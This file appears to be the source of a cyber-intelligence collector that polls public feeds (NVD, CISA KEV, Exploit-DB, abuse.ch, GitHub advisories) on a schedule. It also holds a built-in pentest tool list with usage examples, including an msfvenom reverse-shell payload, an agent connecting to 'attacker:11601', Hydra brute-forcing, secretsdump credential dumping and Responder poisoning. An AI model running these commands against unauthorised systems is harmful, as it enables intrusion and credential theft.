// OpenClaw Cyber — Auto-Learning Cyber Intelligence Engine
// Automatically fetches CVEs, exploits, threat intel, and tool knowledge from the internet
// Runs 24/7 — every 30 minutes when OS is on
import { memory } from './memory.js';
import config from './config.js';

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// Safe fetch with timeout and error handling
async function safeFetch(url, opts = {}) {
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(30000), ...opts });
    if (!res.ok) return null;
    return await res.json();
  } catch { return null; }
}

async function safeFetchText(url) {
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(30000) });
    if (!res.ok) return null;
    return await res.text();
  } catch { return null; }
}

export class AutoLearner {
  constructor() {
    this.isRunning = false;
    this.stats = { cves: 0, exploits: 0, threats: 0, tools: 0, total_runs: 0 };
  }

  async run() {
    if (this.isRunning) return;
    this.isRunning = true;
    this.stats.total_runs++;
    const start = Date.now();
    console.log(`\n🧠 [AutoLearner] Starting cyber intelligence collection... (Run #${this.stats.total_runs})`);

    try {
      memory.init();
      await this.fetchNVDCVEs();
      await sleep(2000);
      await this.fetchCISAKEV();
      await sleep(2000);
      await this.fetchExploitDB();
      await sleep(2000);
      await this.fetchThreatFeeds();
      await sleep(2000);
      await this.learnCyberTools();
      await sleep(1000);
      await this.fetchNucleiTemplateInfo();
      await sleep(1000);
      await this.fetchSecurityNews();
      await sleep(1000);
      await this.fetchGitHubAdvisories();
      await sleep(1000);
      await this.fetchRecentNucleiTemplates();

      const elapsed = ((Date.now() - start) / 1000).toFixed(1);
      console.log(`✅ [AutoLearner] Complete in ${elapsed}s — CVEs: ${this.stats.cves}, Exploits: ${this.stats.exploits}, Threats: ${this.stats.threats}, Tools: ${this.stats.tools}`);
    } catch (err) {
      console.error(`❌ [AutoLearner] Error: ${err.message}`);
    } finally {
      this.isRunning = false;
    }
  }

  // ═══ FETCH LATEST CVEs FROM NVD ═══
  async fetchNVDCVEs() {
    console.log('  📡 Fetching latest CVEs from NVD...');
    const batchId = `nvd-${new Date().toISOString().slice(0, 13)}`; // Hourly batches
    if (memory.isLearned('nvd', batchId)) { console.log('    ⏩ Already fetched this hour'); return; }

    // Get CVEs from last 7 days
    const now = new Date();
    const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
    const pubStart = weekAgo.toISOString().replace(/\.\d{3}Z/, '');
    const pubEnd = now.toISOString().replace(/\.\d{3}Z/, '');

    const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=${pubStart}&pubEndDate=${pubEnd}&resultsPerPage=100`;
    const data = await safeFetch(url);
    if (!data?.vulnerabilities) { console.log('    ⚠️ NVD API unavailable'); return; }

    let count = 0;
    for (const item of data.vulnerabilities) {
      const cve = item.cve;
      if (!cve?.id) continue;

      const metrics = cve.metrics?.cvssMetricV31?.[0] || cve.metrics?.cvssMetricV30?.[0] || cve.metrics?.cvssMetricV2?.[0];
      const cvssScore = metrics?.cvssData?.baseScore || null;
      const severity = metrics?.cvssData?.baseSeverity || (cvssScore >= 9 ? 'CRITICAL' : cvssScore >= 7 ? 'HIGH' : cvssScore >= 4 ? 'MEDIUM' : 'LOW');

      const desc = cve.descriptions?.find(d => d.lang === 'en')?.value || '';
      const refs = cve.references?.map(r => r.url)?.slice(0, 5) || [];
      const affected = cve.configurations?.map(c => c.nodes?.map(n => n.cpeMatch?.map(m => m.criteria))?.flat())?.flat()?.filter(Boolean)?.slice(0, 10) || [];

      memory.storeThreatIntel('cve', cve.id, {
        title: cve.id,
        description: desc.slice(0, 1000),
        severity: severity,
        cvss_score: cvssScore,
        affected_products: affected,
        references: refs,
        source: 'nvd',
        published_at: cve.published || null
      });
      count++;
    }
    this.stats.cves += count;
    memory.markLearned('nvd', batchId, 'cve_batch', count);
    console.log(`    ✅ Stored ${count} CVEs`);
  }

  // ═══ FETCH CISA KEV ═══
  async fetchCISAKEV() {
    console.log('  📡 Fetching CISA Known Exploited Vulnerabilities...');
    const batchId = `cisa-kev-${new Date().toISOString().slice(0, 10)}`; // Daily is fine for KEV
    if (memory.isLearned('cisa', batchId)) { console.log('    ⏩ Already fetched today'); return; }

    const data = await safeFetch('https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json');
    if (!data?.vulnerabilities) { console.log('    ⚠️ CISA KEV unavailable'); return; }

    let count = 0;
    for (const vuln of data.vulnerabilities.slice(0, 200)) {
      memory.storeThreatIntel('kev', vuln.cveID, {
        title: `${vuln.cveID}: ${vuln.vulnerabilityName}`,
        description: `${vuln.shortDescription}. Vendor: ${vuln.vendorProject}. Product: ${vuln.product}. Required Action: ${vuln.requiredAction}`,
        severity: 'CRITICAL',
        source: 'cisa-kev',
        published_at: vuln.dateAdded
      });
      count++;
    }
    this.stats.threats += count;
    memory.markLearned('cisa', batchId, 'kev_batch', count);
    console.log(`    ✅ Stored ${count} KEV entries`);
  }

  // ═══ FETCH EXPLOIT-DB ═══
  async fetchExploitDB() {
    console.log('  📡 Fetching latest exploits from Exploit-DB...');
    const batchId = `edb-${new Date().toISOString().slice(0, 13)}`; // Hourly
    if (memory.isLearned('exploit-db', batchId)) { console.log('    ⏩ Already fetched this hour'); return; }

    // Use the GitLab API for exploit-db mirror
    const data = await safeFetch('https://gitlab.com/api/v4/projects/exploit-database%2Fexploitdb/repository/tree?path=exploits&per_page=50&order_by=updated_at');
    if (!data || !Array.isArray(data)) { 
      // Fallback: try Exploit-DB RSS via proxy
      const rssText = await safeFetchText('https://www.exploit-db.com/rss.xml');
      if (!rssText) { console.log('    ⚠️ Exploit-DB unavailable'); return; }
      
      // Parse RSS items manually
      const items = rssText.match(/<item>[\s\S]*?<\/item>/g) || [];
      let count = 0;
      for (const item of items.slice(0, 50)) {
        const title = item.match(/<title>(.*?)<\/title>/)?.[1] || '';
        const link = item.match(/<link>(.*?)<\/link>/)?.[1] || '';
        const desc = item.match(/<description>(.*?)<\/description>/)?.[1] || '';
        const pubDate = item.match(/<pubDate>(.*?)<\/pubDate>/)?.[1] || '';
        const edbId = link.match(/\/(\d+)/)?.[1] || `edb-${count}`;
        
        memory.storeExploit(`EDB-${edbId}`, {
          title: title.replace(/<!\[CDATA\[|\]\]>/g, ''),
          description: desc.replace(/<!\[CDATA\[|\]\]>/g, '').replace(/<[^>]+>/g, '').slice(0, 500),
          source_url: link,
          source: 'exploit-db',
          published_at: pubDate
        });
        count++;
      }
      this.stats.exploits += count;
      memory.markLearned('exploit-db', batchId, 'exploit_batch', count);
      console.log(`    ✅ Stored ${count} exploits (RSS)`);
      return;
    }

    let count = 0;
    for (const entry of data) {
      if (entry.type !== 'blob') continue;
      const edbId = entry.name.replace(/\.\w+$/, '');
      if (memory.isLearned('exploit-db', edbId)) continue;
      memory.storeExploit(edbId, { title: entry.name, source: 'exploit-db-git', source_url: `https://www.exploit-db.com/exploits/${edbId}` });
      count++;
    }
    this.stats.exploits += count;
    memory.markLearned('exploit-db', batchId, 'exploit_batch', count);
    console.log(`    ✅ Stored ${count} exploits`);
  }

  // ═══ THREAT FEEDS (abuse.ch, AlienVault) ═══
  async fetchThreatFeeds() {
    console.log('  📡 Fetching threat intelligence feeds...');
    const batchId = `feeds-${new Date().toISOString().slice(0, 13)}`; // Hourly
    if (memory.isLearned('threat-feeds', batchId)) { console.log('    ⏩ Already fetched this hour'); return; }

    let count = 0;

    // abuse.ch Malware Bazaar — Recent malware samples
    const malwareData = await safeFetch('https://mb-api.abuse.ch/api/v1/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'query=get_recent&selector=100'
    });

    if (malwareData?.data) {
      for (const sample of malwareData.data.slice(0, 100)) {
        memory.storeThreatIntel('malware', sample.sha256_hash || sample.md5_hash, {
          title: sample.file_name || sample.sha256_hash,
          description: `Malware sample. Type: ${sample.file_type}. Signature: ${sample.signature}. Tags: ${(sample.tags || []).join(', ')}`,
          severity: 'HIGH',
          source: 'abuse.ch-malwarebazaar',
          published_at: sample.first_seen
        });
        count++;
      }
    }

    // abuse.ch URLhaus — Malicious URLs
    const urlData = await safeFetch('https://urlhaus-api.abuse.ch/v1/urls/recent/limit/50/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'limit=50'
    });

    if (urlData?.urls) {
      for (const url of urlData.urls.slice(0, 50)) {
        memory.storeThreatIntel('malicious_url', url.url, {
          title: `Malicious URL: ${url.url.slice(0, 100)}`,
          description: `Threat: ${url.threat}. Status: ${url.url_status}. Tags: ${(url.tags || []).join(', ')}`,
          severity: 'HIGH',
          source: 'abuse.ch-urlhaus',
          published_at: url.date_added
        });
        count++;
      }
    }

    // abuse.ch ThreatFox — IOCs
    const iocData = await safeFetch('https://threatfox-api.abuse.ch/api/v1/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: 'get_iocs', days: 7 })
    });

    if (iocData?.data) {
      for (const ioc of (Array.isArray(iocData.data) ? iocData.data : []).slice(0, 100)) {
        memory.storeThreatIntel('ioc', ioc.ioc, {
          title: `IOC: ${ioc.ioc_type} - ${ioc.ioc?.slice(0, 80)}`,
          description: `Threat: ${ioc.threat_type}. Malware: ${ioc.malware_printable}. Confidence: ${ioc.confidence_level}%`,
          severity: ioc.confidence_level > 80 ? 'HIGH' : 'MEDIUM',
          source: 'abuse.ch-threatfox',
          published_at: ioc.first_seen_utc
        });
        count++;
      }
    }

    this.stats.threats += count;
    memory.markLearned('threat-feeds', batchId, 'ioc_batch', count);
    console.log(`    ✅ Stored ${count} threat intel items`);
  }

  // ═══ LEARN CYBERSECURITY TOOLS ═══
  async learnCyberTools() {
    console.log('  📡 Learning cybersecurity tools knowledge...');
    if (memory.isLearned('tools', 'cyber-tools-v2')) { console.log('    ⏩ Already learned'); return; }

    const tools = [
      { name: 'nmap', cat: 'reconnaissance', desc: 'Network exploration and security auditing tool. Port scanning, service detection, OS detection, scripting engine (NSE).', install: 'sudo apt install nmap', url: 'https://nmap.org', examples: ['nmap -sV -sC target', 'nmap -A -T4 target', 'nmap --script vuln target'] },
      { name: 'nuclei', cat: 'vulnerability-scanner', desc: 'Fast and customizable vulnerability scanner based on simple YAML templates. 8000+ community templates for CVEs, misconfigs, default creds.', install: 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest', url: 'https://github.com/projectdiscovery/nuclei', examples: ['nuclei -u target -severity critical,high', 'nuclei -u target -tags cve', 'nuclei -u target -t /path/to/template.yaml'] },
      { name: 'subfinder', cat: 'subdomain-discovery', desc: 'Passive subdomain enumeration tool using 30+ sources including Shodan, VirusTotal, SecurityTrails.', install: 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest', url: 'https://github.com/projectdiscovery/subfinder', examples: ['subfinder -d domain.com', 'subfinder -d domain.com -recursive'] },
      { name: 'httpx', cat: 'http-probing', desc: 'Multi-purpose HTTP toolkit for probing URLs, discovering tech stacks, status codes, titles.', install: 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest', url: 'https://github.com/projectdiscovery/httpx', examples: ['echo domain.com | httpx -tech-detect', 'cat subs.txt | httpx -status-code -title'] },
      { name: 'naabu', cat: 'port-scanner', desc: 'Fast port scanner written in Go. SYN/CONNECT scan with service detection.', install: 'go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest', url: 'https://github.com/projectdiscovery/naabu', examples: ['naabu -host target -top-ports 1000', 'naabu -host target -p - -rate 5000'] },
      { name: 'katana', cat: 'web-crawler', desc: 'Next-gen web crawling and spidering framework. Discovers endpoints, params, JS files, API routes.', install: 'go install github.com/projectdiscovery/katana/cmd/katana@latest', url: 'https://github.com/projectdiscovery/katana', examples: ['katana -u https://target.com -d 5 -js-crawl', 'katana -u target -headless'] },
      { name: 'dnsx', cat: 'dns-toolkit', desc: 'Fast DNS toolkit for mass DNS resolution, brute-forcing, wildcard filtering.', install: 'go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest', url: 'https://github.com/projectdiscovery/dnsx', examples: ['echo domain.com | dnsx -a -resp', 'cat subs.txt | dnsx -cname -mx -txt'] },
      { name: 'uncover', cat: 'search-engine', desc: 'Aggregates results from Shodan, Censys, FOFA, Hunter, ZoomEye into unified format.', install: 'go install github.com/projectdiscovery/uncover/cmd/uncover@latest', url: 'https://github.com/projectdiscovery/uncover', examples: ['uncover -q "apache 2.4.49" -e shodan', 'uncover -q "port:3389" -e censys'] },
      { name: 'metasploit', cat: 'exploitation', desc: 'World\'s most used penetration testing framework. Exploit development, payload generation, post-exploitation.', install: 'sudo apt install metasploit-framework', url: 'https://www.metasploit.com', examples: ['msfconsole -q -x "use exploit/multi/handler"', 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=port -f elf -o shell'] },
      { name: 'burpsuite', cat: 'web-proxy', desc: 'Web application security testing platform. Proxy, scanner, intruder, repeater, decoder.', install: 'Download from https://portswigger.net/burp', url: 'https://portswigger.net/burp', examples: ['burpsuite &'] },
      { name: 'sqlmap', cat: 'sql-injection', desc: 'Automatic SQL injection and database takeover tool. Supports MySQL, PostgreSQL, MSSQL, Oracle.', install: 'sudo apt install sqlmap', url: 'https://sqlmap.org', examples: ['sqlmap -u "url?id=1" --dbs', 'sqlmap -r request.txt --batch --level 5'] },
      { name: 'hydra', cat: 'password-cracking', desc: 'Fast network logon cracker. Supports 50+ protocols: SSH, FTP, HTTP, RDP, MySQL, etc.', install: 'sudo apt install hydra', url: 'https://github.com/vanhauser-thc/thc-hydra', examples: ['hydra -l admin -P wordlist.txt ssh://target', 'hydra -L users.txt -P pass.txt target http-post-form'] },
      { name: 'hashcat', cat: 'password-cracking', desc: 'Advanced password recovery. GPU-accelerated hash cracking for 300+ hash types.', install: 'sudo apt install hashcat', url: 'https://hashcat.net', examples: ['hashcat -m 0 hash.txt wordlist.txt', 'hashcat -m 22000 capture.hc22000 wordlist.txt'] },
      { name: 'john', cat: 'password-cracking', desc: 'John the Ripper — password cracker supporting hundreds of hash/cipher types.', install: 'sudo apt install john', url: 'https://www.openwall.com/john/', examples: ['john --wordlist=rockyou.txt hash.txt', 'john --format=Raw-SHA256 hash.txt'] },
      { name: 'aircrack-ng', cat: 'wireless', desc: 'WiFi security auditing suite. Monitor mode, packet injection, WPA/WPA2 cracking.', install: 'sudo apt install aircrack-ng', url: 'https://www.aircrack-ng.org', examples: ['airmon-ng start wlan0', 'airodump-ng wlan0', 'aircrack-ng -w wordlist capture.cap'] },
      { name: 'wireshark', cat: 'packet-analysis', desc: 'Network protocol analyzer. Deep inspection of hundreds of protocols, live capture and analysis.', install: 'sudo apt install wireshark', url: 'https://www.wireshark.org', examples: ['wireshark &', 'tshark -i eth0 -f "port 80"'] },
      { name: 'gobuster', cat: 'directory-brute', desc: 'Directory/file brute-forcing tool. Fast Go implementation for web content discovery.', install: 'sudo apt install gobuster', url: 'https://github.com/OJ/gobuster', examples: ['gobuster dir -u target -w wordlist.txt', 'gobuster dns -d domain.com -w subs.txt'] },
      { name: 'ffuf', cat: 'web-fuzzer', desc: 'Fast web fuzzer written in Go. Content discovery, parameter fuzzing, vhost discovery.', install: 'go install github.com/ffuf/ffuf/v2@latest', url: 'https://github.com/ffuf/ffuf', examples: ['ffuf -u target/FUZZ -w wordlist.txt', 'ffuf -u target -H "Host: FUZZ.domain" -w vhosts.txt'] },
      { name: 'responder', cat: 'mitm', desc: 'LLMNR/NBT-NS/mDNS poisoner for credential harvesting on internal networks.', install: 'sudo apt install responder', url: 'https://github.com/lgandx/Responder', examples: ['sudo responder -I eth0 -dwPv'] },
      { name: 'impacket', cat: 'active-directory', desc: 'Collection of Python classes for working with network protocols. AD attacks, relay, secretsdump.', install: 'pip install impacket', url: 'https://github.com/fortra/impacket', examples: ['impacket-psexec domain/user:pass@target', 'impacket-secretsdump domain/user:pass@target'] },
      { name: 'bloodhound', cat: 'active-directory', desc: 'AD relationship visualization. Maps attack paths from compromised users to domain admin.', install: 'sudo apt install bloodhound', url: 'https://github.com/BloodHoundAD/BloodHound', examples: ['bloodhound-python -c All -d domain.local -u user -p pass'] },
      { name: 'crackmapexec', cat: 'active-directory', desc: 'Swiss army knife for pentesting Windows/AD. SMB, LDAP, WinRM, MSSQL enumeration and exploitation.', install: 'pip install crackmapexec', url: 'https://github.com/byt3bl33d3r/CrackMapExec', examples: ['crackmapexec smb targets -u user -p pass --shares', 'crackmapexec smb targets -u user -p pass --sam'] },
      { name: 'chisel', cat: 'tunneling', desc: 'Fast TCP/UDP tunnel over HTTP. Bypasses firewalls for port forwarding and pivoting.', install: 'go install github.com/jpillora/chisel@latest', url: 'https://github.com/jpillora/chisel', examples: ['chisel server -p 8080 --reverse', 'chisel client server:8080 R:socks'] },
      { name: 'ligolo-ng', cat: 'tunneling', desc: 'Advanced tunneling tool using TUN interface. No SOCKS overhead, full network access through pivots.', install: 'Download from github.com/nicocha30/ligolo-ng', url: 'https://github.com/nicocha30/ligolo-ng', examples: ['./proxy -selfcert', './agent -connect attacker:11601'] },
      { name: 'feroxbuster', cat: 'directory-brute', desc: 'Recursive content discovery tool. Fast, concurrent, with automatic recursion into discovered directories.', install: 'sudo apt install feroxbuster', url: 'https://github.com/epi052/feroxbuster', examples: ['feroxbuster -u target -w wordlist.txt', 'feroxbuster -u target --smart -d 4'] },
    ];

    let count = 0;
    for (const t of tools) {
      memory.storeToolKnowledge(t.name, {
        category: t.cat, description: t.desc,
        usage_examples: t.examples, install_command: t.install,
        official_url: t.url, source: 'built-in'
      });
      count++;
    }
    this.stats.tools += count;
    memory.markLearned('tools', 'cyber-tools-v2', 'tool_batch', count);
    console.log(`    ✅ Stored ${count} tool knowledge entries`);
  }

  // ═══ LEARN NUCLEI TEMPLATE CATEGORIES ═══
  async fetchNucleiTemplateInfo() {
    console.log('  📡 Fetching Nuclei template stats...');
    if (memory.isLearned('nuclei', 'template-stats-v1')) { console.log('    ⏩ Already learned'); return; }

    const data = await safeFetch('https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/TEMPLATES-STATS.json');
    if (!data) {
      // Store built-in knowledge instead
      memory.storeKnowledge('nuclei-template-categories', JSON.stringify({
        total: '8000+',
        categories: ['cves', 'default-logins', 'exposed-panels', 'exposures', 'file', 'fuzzing', 'headless', 'helpers', 'iot', 'javascript', 'miscellaneous', 'misconfiguration', 'network', 'osint', 'ssl', 'takeovers', 'technologies', 'token-spray', 'vulnerabilities', 'workflows']
      }), 'nuclei');
    } else {
      memory.storeKnowledge('nuclei-template-stats', JSON.stringify(data), 'nuclei');
    }
    memory.markLearned('nuclei', 'template-stats-v1', 'template_info', 1);
    console.log('    ✅ Stored Nuclei template info');
  }

  // ═══ SECURITY NEWS ═══
  async fetchSecurityNews() {
    console.log('  📡 Fetching security news feeds...');
    const batchId = `news-${new Date().toISOString().slice(0, 13)}`; // Hourly
    if (memory.isLearned('security-news', batchId)) { console.log('    ⏩ Already fetched this hour'); return; }

    // Fetch from Hacker News security stories  
    const hnData = await safeFetch('https://hn.algolia.com/api/v1/search?query=cybersecurity%20vulnerability%20exploit&tags=story&hitsPerPage=20');
    let count = 0;
    if (hnData?.hits) {
      for (const hit of hnData.hits) {
        memory.storeKnowledge(`news:${hit.objectID}`, JSON.stringify({
          title: hit.title, url: hit.url, points: hit.points,
          created_at: hit.created_at, source: 'hackernews'
        }), 'security-news');
        count++;
      }
    }

    memory.markLearned('security-news', batchId, 'news_batch', count);
    console.log(`    ✅ Stored ${count} security news items`);
  }

  getStats() {
    return { ...this.stats };
  }

  // ═══ FETCH GITHUB SECURITY ADVISORIES ═══
  async fetchGitHubAdvisories() {
    console.log('  📡 Fetching GitHub Security Advisories...');
    const batchId = `ghsa-${new Date().toISOString().slice(0, 13)}`;
    if (memory.isLearned('github-advisories', batchId)) { console.log('    ⏩ Already fetched this hour'); return; }

    const data = await safeFetch('https://api.github.com/advisories?per_page=50&type=reviewed');
    if (!data || !Array.isArray(data)) { console.log('    ⚠️ GitHub Advisories API unavailable'); return; }

    let count = 0;
    for (const adv of data) {
      const cveId = adv.cve_id || adv.ghsa_id;
      memory.storeThreatIntel('advisory', cveId, {
        title: `${cveId}: ${adv.summary || ''}`.slice(0, 200),
        description: (adv.description || '').slice(0, 1000),
        severity: (adv.severity || 'unknown').toUpperCase(),
        cvss_score: adv.cvss?.score || null,
        source: 'github-advisories',
        published_at: adv.published_at
      });
      count++;
    }
    this.stats.cves += count;
    memory.markLearned('github-advisories', batchId, 'advisory_batch', count);
    console.log(`    ✅ Stored ${count} GitHub advisories`);
  }

  // ═══ FETCH RECENT NUCLEI TEMPLATES (NEW VULNS) ═══
  async fetchRecentNucleiTemplates() {
    console.log('  📡 Fetching recent Nuclei template updates...');
    const batchId = `nuclei-recent-${new Date().toISOString().slice(0, 10)}`;
    if (memory.isLearned('nuclei-recent', batchId)) { console.log('    ⏩ Already fetched today'); return; }

    // Get recent commits to nuclei-templates for new CVE detections
    const commits = await safeFetch('https://api.github.com/repos/projectdiscovery/nuclei-templates/commits?per_page=20');
    if (!commits || !Array.isArray(commits)) { console.log('    ⚠️ GitHub API unavailable'); return; }

    let count = 0;
    for (const commit of commits) {
      const msg = commit.commit?.message || '';
      const sha = commit.sha?.slice(0, 8) || '';
      const date = commit.commit?.author?.date || '';
      // Extract CVE references from commit messages
      const cves = msg.match(/CVE-\d{4}-\d{4,}/g) || [];
      for (const cve of cves) {
        memory.storeKnowledge(`nuclei-template:${cve}`, JSON.stringify({
          cve, commit: sha, date, message: msg.slice(0, 200),
          source: 'nuclei-templates'
        }), 'nuclei-templates');
        count++;
      }
    }
    memory.markLearned('nuclei-recent', batchId, 'template_updates', count);
    console.log(`    ✅ Tracked ${count} CVE templates from recent commits`);
  }
}

export const autoLearner = new AutoLearner();
